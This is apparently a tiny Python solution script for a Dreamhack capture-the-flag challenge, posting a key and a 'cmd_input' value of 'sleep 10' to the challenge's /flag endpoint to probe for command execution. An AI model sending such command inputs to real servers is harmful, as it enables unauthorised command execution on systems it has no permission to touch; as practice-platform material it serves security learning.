import requests
url = "http://host3.dreamhack.games:16782/flag"

data = {"key":"409ac0d96943d3da52f176ae9ff2b974", "cmd_input":"sleep 10"}

res = requests.post(url, data=data)
print(res.text)